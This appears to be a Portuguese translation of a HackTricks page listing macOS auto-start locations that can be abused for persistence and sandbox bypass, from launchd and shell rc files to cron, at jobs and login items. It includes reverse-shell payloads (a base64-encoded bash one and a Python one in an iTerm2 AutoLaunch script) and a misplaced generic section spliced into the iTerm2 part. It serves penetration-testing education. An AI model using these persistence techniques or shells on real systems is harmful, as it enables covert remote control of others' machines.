# Auto Inicialização no macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Esta seção é baseada na série de blogs [**Além dos bons e velhos LaunchAgents**](https://theevilbit.github.io/beyond/), o objetivo é adicionar **mais Locais de Auto Inicialização** (se possível), indicar **quais técnicas ainda estão funcionando** atualmente com a versão mais recente do macOS (13.4) e especificar as **permissões** necessárias.

## Bypass de Sandbox

{% hint style="success" %}
Aqui você pode encontrar locais de inicialização úteis para **bypass de sandbox** que permitem que você simplesmente execute algo **escrevendo-o em um arquivo** e **aguardando** uma **ação** muito **comum**, uma determinada **quantidade de tempo** ou uma **ação que você geralmente pode realizar** de dentro de uma sandbox sem precisar de permissões de root.
{% endhint %}

### Launchd

* Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Locais

* **`/Library/LaunchAgents`**
* **Gatilho**: Reinicialização
* Requer privilégios de root
* **`/Library/LaunchDaemons`**
* **Gatilho**: Reinicialização
* Requer privilégios de root
* **`/System/Library/LaunchAgents`**
* **Gatilho**: Reinicialização
* Requer privilégios de root
* **`/System/Library/LaunchDaemons`**
* **Gatilho**: Reinicialização
* Requer privilégios de root
* **`~/Library/LaunchAgents`**
* **Gatilho**: Reentrada
* **`~/Library/LaunchDemons`**
* **Gatilho**: Reentrada

#### Descrição e Exploração

**`launchd`** é o **primeiro** **processo** executado pelo kernel do OX S na inicialização e o último a ser finalizado no desligamento. Ele sempre deve ter o **PID 1**. Este processo irá **ler e executar** as configurações indicadas nos **plists** do **ASEP** em:

* `/Library/LaunchAgents`: Agentes por usuário instalados pelo administrador
* `/Library/LaunchDaemons`: Daemons em todo o sistema instalados pelo administrador
* `/System/Library/LaunchAgents`: Agentes por usuário fornecidos pela Apple.
* `/System/Library/LaunchDaemons`: Daemons em todo o sistema fornecidos pela Apple.

Quando um usuário faz login, os plists localizados em `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` são iniciados com as **permissões dos usuários logados**.

A **principal diferença entre agentes e daemons é que os agentes são carregados quando o usuário faz login e os daemons são carregados na inicialização do sistema** (pois existem serviços como ssh que precisam ser executados antes que qualquer usuário acesse o sistema). Além disso, os agentes podem usar a GUI, enquanto os daemons precisam ser executados em segundo plano.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Existem casos em que um **agente precisa ser executado antes do login do usuário**, esses são chamados de **PreLoginAgents**. Por exemplo, isso é útil para fornecer tecnologia assistiva no momento do login. Eles também podem ser encontrados em `/Library/LaunchAgents` (veja [**aqui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) um exemplo).

{% hint style="info" %}
Os arquivos de configuração de Novos Daemons ou Agents serão **carregados após a próxima reinicialização ou usando** `launchctl load <target.plist>`. Também é possível carregar arquivos .plist sem essa extensão com `launchctl -F <file>` (no entanto, esses arquivos plist não serão carregados automaticamente após a reinicialização).\
Também é possível **descarregar** com `launchctl unload <target.plist>` (o processo apontado por ele será encerrado).

Para **garantir** que não haja **nada** (como uma substituição) **impedindo** que um **Agente** ou **Daemon** **seja executado**, execute: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Liste todos os agentes e daemons carregados pelo usuário atual:
```bash
launchctl list
```
{% hint style="warning" %}
Se um plist é de propriedade de um usuário, mesmo que esteja em pastas de sistema de daemon, a **tarefa será executada como o usuário** e não como root. Isso pode prevenir alguns ataques de escalonamento de privilégios.
{% endhint %}

### Arquivos de inicialização do shell

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Localizações

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
* **Gatilho**: Abrir um terminal com zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Gatilho**: Abrir um terminal com zsh
* Requer privilégios de root
* **`~/.zlogout`**
* **Gatilho**: Fechar um terminal com zsh
* **`/etc/zlogout`**
* **Gatilho**: Fechar um terminal com zsh
* Requer privilégios de root
* Potencialmente mais em: **`man zsh`**
* **`~/.bashrc`**
* **Gatilho**: Abrir um terminal com bash
* `/etc/profile` (não funcionou)
* `~/.profile` (não funcionou)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Gatilho**: Esperado para ser acionado com xterm, mas **não está instalado** e mesmo depois de instalado esse erro é exibido: xterm: `DISPLAY is not set`

#### Descrição e Exploração

Os arquivos de inicialização do shell são executados quando nosso ambiente de shell, como `zsh` ou `bash`, está **iniciando**. O macOS agora usa `/bin/zsh` como padrão e, **sempre que abrimos o `Terminal` ou fazemos SSH** no dispositivo, é nesse ambiente de shell que somos colocados. O `bash` e o `sh` ainda estão disponíveis, mas precisam ser iniciados especificamente.

A página do manual do zsh, que podemos ler com **`man zsh`**, tem uma descrição longa dos arquivos de inicialização.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Aplicativos Reabertos

{% hint style="danger" %}
Configurar a exploração indicada e fazer logout e login ou até mesmo reiniciar não funcionou para mim executar o aplicativo. (O aplicativo não estava sendo executado, talvez precise estar em execução quando essas ações forem realizadas)
{% endhint %}

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Localização

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Gatilho**: Reiniciar reabrindo aplicativos

#### Descrição e Exploração

Todos os aplicativos a serem reabertos estão dentro do plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Portanto, para fazer com que os aplicativos reabertos executem o seu próprio aplicativo, você só precisa **adicionar seu aplicativo à lista**.

O UUID pode ser encontrado listando esse diretório ou com `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para verificar os aplicativos que serão reabertos, você pode fazer:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Para **adicionar um aplicativo a esta lista**, você pode usar:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferências do Terminal

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Localização

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Gatilho**: Abrir Terminal

#### Descrição e Exploração

Em **`~/Library/Preferences`** são armazenadas as preferências do usuário nos aplicativos. Algumas dessas preferências podem conter uma configuração para **executar outros aplicativos/scripts**.

Por exemplo, o Terminal pode executar um comando na inicialização:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Essa configuração é refletida no arquivo **`~/Library/Preferences/com.apple.Terminal.plist`** da seguinte forma:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Então, se o plist das preferências do terminal no sistema puder ser sobrescrito, então a funcionalidade **`open`** pode ser usada para **abrir o terminal e executar esse comando**.

Você pode adicionar isso a partir da linha de comando com:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Scripts do Terminal

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Localização

* **Qualquer lugar**
* **Gatilho**: Abrir Terminal

#### Descrição e Exploração

Se você criar um script **`.terminal`** e abri-lo, o aplicativo **Terminal** será automaticamente invocado para executar os comandos indicados nele. Se o aplicativo Terminal tiver privilégios especiais (como TCC), seu comando será executado com esses privilégios especiais.

Experimente com:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
{% hint style="danger" %}
Se o terminal tiver **Acesso Total ao Disco**, ele poderá concluir essa ação (observe que o comando executado será visível em uma janela do terminal).
{% endhint %}

### Plugins de Áudio

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### Localização

* **`/Library/Audio/Plug-Ins/HAL`**
* Requer privilégios de root
* **Gatilho**: Reiniciar o coreaudiod ou o computador
* **`/Library/Audio/Plug-ins/Components`**
* Requer privilégios de root
* **Gatilho**: Reiniciar o coreaudiod ou o computador
* **`~/Library/Audio/Plug-ins/Components`**
* **Gatilho**: Reiniciar o coreaudiod ou o computador
* **`/System/Library/Components`**
* Requer privilégios de root
* **Gatilho**: Reiniciar o coreaudiod ou o computador

#### Descrição

De acordo com os writeups anteriores, é possível **compilar alguns plugins de áudio** e carregá-los.

### Plugins QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Localização

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/NomeDoAplicativoAqui/Contents/Library/QuickLook/`
* `~/Applications/NomeDoAplicativoAqui/Contents/Library/QuickLook/`

#### Descrição e Exploração

Os plugins QuickLook podem ser executados quando você **aciona a visualização de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin que suporte esse tipo de arquivo** esteja instalado.

É possível compilar seu próprio plugin QuickLook, colocá-lo em uma das localizações anteriores para carregá-lo e, em seguida, ir para um arquivo suportado e pressionar espaço para ativá-lo.

### ~~Hooks de Login/Logout~~

{% hint style="danger" %}
Isso não funcionou para mim, nem com o LoginHook do usuário nem com o LogoutHook do root.
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Localização

* Você precisa ser capaz de executar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Localizado em `~/Library/Preferences/com.apple.loginwindow.plist`

Eles estão obsoletos, mas podem ser usados para executar comandos quando um usuário faz login.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Essa configuração é armazenada em `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Para deletar:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
O usuário root é armazenado em **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass Condicional do Sandbox

{% hint style="success" %}
Aqui você pode encontrar locais de inicialização úteis para **bypass do sandbox** que permite que você simplesmente execute algo **escrevendo-o em um arquivo** e **esperando condições não muito comuns** como programas específicos instalados, ações ou ambientes de usuário "incomuns".
{% endhint %}

### Cron

**Descrição**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Útil para bypass do sandbox: [✅](https://emojipedia.org/check-mark-button)
* No entanto, você precisa ser capaz de executar o binário `crontab`
* Ou ser root

#### Localização

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Root necessário para acesso direto de escrita. Não é necessário ser root se você puder executar `crontab <arquivo>`
* **Gatilho**: Depende do trabalho cron

#### Descrição e Exploração

Liste os trabalhos cron do **usuário atual** com:
```bash
crontab -l
```
Você também pode ver todos os trabalhos cron dos usuários em **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (necessita de privilégios de root).

No MacOS, várias pastas que executam scripts com **determinada frequência** podem ser encontradas em:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Aqui você pode encontrar os **cron jobs** regulares, os **at jobs** (pouco utilizados) e os **periodic jobs** (principalmente usados para limpar arquivos temporários). Os jobs periódicos diários podem ser executados, por exemplo, com: `periodic daily`.

Para adicionar um **cronjob de usuário programaticamente**, é possível usar:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Descrição: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Localizações

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Gatilho**: Abrir o iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Gatilho**: Abrir o iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Gatilho**: Abrir o iTerm

#### Descrição e Exploração

Os scripts armazenados em **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** serão executados. Por exemplo:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
# Localizações de Inicialização Automática no macOS

O macOS possui várias localizações onde os aplicativos podem ser configurados para iniciar automaticamente quando o sistema é inicializado. Essas localizações são usadas por aplicativos legítimos para fornecer funcionalidades como iniciar em segundo plano ou abrir janelas na inicialização do sistema.

No entanto, essas localizações também podem ser exploradas por atacantes para executar malware ou persistir em um sistema comprometido. Portanto, é importante estar ciente dessas localizações e monitorá-las regularmente para garantir que apenas aplicativos confiáveis estejam configurados para iniciar automaticamente.

Aqui estão algumas das principais localizações de inicialização automática no macOS:

## 1. LaunchAgents

Os LaunchAgents são arquivos de propriedade de um usuário específico e são usados para iniciar aplicativos quando esse usuário faz login. Eles são armazenados no diretório `~/Library/LaunchAgents/` e têm a extensão `.plist`. Os LaunchAgents podem ser usados para iniciar aplicativos em segundo plano ou exibir janelas na inicialização do sistema.

## 2. LaunchDaemons

Os LaunchDaemons são arquivos de propriedade do sistema e são usados para iniciar aplicativos quando o sistema é inicializado. Eles são armazenados no diretório `/Library/LaunchDaemons/` e têm a extensão `.plist`. Os LaunchDaemons são executados no contexto do usuário root e podem ser usados para iniciar serviços de sistema ou executar tarefas críticas.

## 3. Login Items

Os Login Items são aplicativos ou itens de inicialização que são configurados para iniciar quando um usuário faz login. Eles são gerenciados nas preferências do sistema e podem ser encontrados na guia "Usuários e Grupos". Os Login Items podem ser usados para iniciar aplicativos específicos para um usuário ou para todos os usuários do sistema.

## 4. Startup Items

Os Startup Items são aplicativos ou scripts que são configurados para iniciar quando o sistema é inicializado. Eles são armazenados no diretório `/Library/StartupItems/` e são executados no contexto do usuário root. No entanto, os Startup Items foram descontinuados a partir do macOS 10.4 e não são mais suportados nas versões mais recentes do macOS.

## 5. Cron Jobs

Os Cron Jobs são tarefas agendadas que são executadas em intervalos regulares. Eles são configurados usando o utilitário `cron` e podem ser usados para iniciar aplicativos ou executar scripts na inicialização do sistema. Os Cron Jobs são armazenados no arquivo `/etc/crontab` e nos arquivos no diretório `/usr/lib/cron/`.

## 6. LaunchAgents e LaunchDaemons de Terceiros

Além das localizações mencionadas acima, os aplicativos de terceiros também podem instalar seus próprios LaunchAgents e LaunchDaemons. Esses arquivos podem ser encontrados em várias localizações, como `/Library/LaunchAgents/`, `/Library/LaunchDaemons/` e `/System/Library/LaunchAgents/`. É importante monitorar essas localizações para garantir que apenas aplicativos confiáveis estejam configurados para iniciar automaticamente.

## Conclusão

Conhecer as localizações de inicialização automática no macOS é essencial para garantir a segurança do sistema. Monitorar regularmente essas localizações e remover qualquer aplicativo indesejado ou malicioso é uma prática recomendada. Além disso, é importante manter o sistema operacional e os aplicativos atualizados para evitar vulnerabilidades conhecidas que possam ser exploradas por atacantes.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
O script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** também será executado:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
As preferências do iTerm2 localizadas em **`~/Library/Preferences/com.googlecode.iterm2.plist`** podem **indicar um comando a ser executado** quando o terminal do iTerm2 é aberto.

Essa configuração pode ser feita nas configurações do iTerm2:

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

E o comando é refletido nas preferências:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Você pode definir o comando a ser executado com:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
É altamente provável que existam **outras maneiras de abusar das preferências do iTerm2** para executar comandos arbitrários.
{% endhint %}

### xbar

Artigo: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas o xbar deve estar instalado

#### Localização

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Gatilho**: Uma vez que o xbar é executado

### Hammerspoon

**Artigo**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)

#### Localização

* **`~/.hammerspoon/init.lua`**
* **Gatilho**: Uma vez que o hammerspoon é executado

#### Descrição

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) é uma ferramenta de automação que permite a **scripting do macOS através da linguagem de script LUA**. Podemos até incorporar código AppleScript completo, bem como executar scripts de shell.

O aplicativo procura por um único arquivo, `~/.hammerspoon/init.lua`, e quando iniciado, o script será executado.
```bash
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("id > /tmp/hs.txt")
EOF
```
### SSHRC

Descrição: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas o ssh precisa estar habilitado e em uso

#### Localização

* **`~/.ssh/rc`**
* **Gatilho**: Login via ssh
* **`/etc/ssh/sshrc`**
* Requer privilégios de root
* **Gatilho**: Login via ssh

#### Descrição e Exploração

Por padrão, a menos que `PermitUserRC no` esteja definido em `/etc/ssh/sshd_config`, quando um usuário faz **login via SSH**, os scripts **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** serão executados.

#### Descrição

Se o programa popular [**xbar**](https://github.com/matryer/xbar) estiver instalado, é possível escrever um script shell em **`~/Library/Application\ Support/xbar/plugins/`** que será executado quando o xbar for iniciado:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### **Itens de Login**

Descrição: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas você precisa executar `osascript` com argumentos

#### Localizações

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Gatilho:** Login
* Payload de exploração armazenado chamando **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Gatilho:** Login
* Requer privilégios de root

#### Descrição

Em Preferências do Sistema -> Usuários e Grupos -> **Itens de Login**, você pode encontrar **itens a serem executados quando o usuário fizer login**.\
É possível listá-los, adicionar e remover a partir da linha de comando:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Esses itens são armazenados no arquivo **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Os **itens de login** também podem ser indicados usando a API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), que armazenará a configuração em **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP como Item de Login

(Verifique a seção anterior sobre Itens de Login, esta é uma extensão)

Se você armazenar um arquivo **ZIP** como um **Item de Login**, o **`Archive Utility`** o abrirá e, se o zip estiver armazenado, por exemplo, em **`~/Library`** e contiver a pasta **`LaunchAgents/file.plist`** com uma backdoor, essa pasta será criada (não é por padrão) e o plist será adicionado para que da próxima vez que o usuário fizer login novamente, a **backdoor indicada no plist será executada**.

Outra opção seria criar os arquivos **`.bash_profile`** e **`.zshenv`** dentro do diretório HOME do usuário, para que, se a pasta LaunchAgents já existir, essa técnica ainda funcione.

### At

Artigo: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### Localização

* Precisa **executar** o **`at`** e ele deve estar **habilitado**

#### **Descrição**

"As tarefas at" são usadas para **agendar tarefas em horários específicos**.\
Essas tarefas diferem do cron no sentido de que **são tarefas únicas** que são removidas após a execução. No entanto, elas **sobrevivem a uma reinicialização do sistema**, portanto, não podem ser descartadas como uma ameaça potencial.

Por **padrão**, elas estão **desabilitadas**, mas o usuário **root** pode **habilitá-las** com:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Isso criará um arquivo em 1 hora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Verifique a fila de trabalhos usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Acima, podemos ver dois trabalhos agendados. Podemos imprimir os detalhes do trabalho usando `at -c NUMERODOTRABALHO`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Se as tarefas AT não estiverem habilitadas, as tarefas criadas não serão executadas.
{% endhint %}

Os **arquivos de tarefa** podem ser encontrados em `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
O nome do arquivo contém a fila, o número do trabalho e o horário programado para ser executado. Por exemplo, vamos dar uma olhada em `a0001a019bdcd2`.

* `a` - esta é a fila
* `0001a` - número do trabalho em hexadecimal, `0x1a = 26`
* `019bdcd2` - tempo em hexadecimal. Representa os minutos decorridos desde o epoch. `0x019bdcd2` é `26991826` em decimal. Se multiplicarmos por 60, obtemos `1619509560`, que é `GMT: 27 de abril de 2021, terça-feira, 7:46:00`.

Se imprimirmos o arquivo do trabalho, descobrimos que ele contém as mesmas informações que obtivemos usando `at -c`.

### Ações de Pasta

Artigo: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Artigo: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
* Mas você precisa ser capaz de chamar o osascript com argumentos e ser capaz de configurar Ações de Pasta

#### Localização

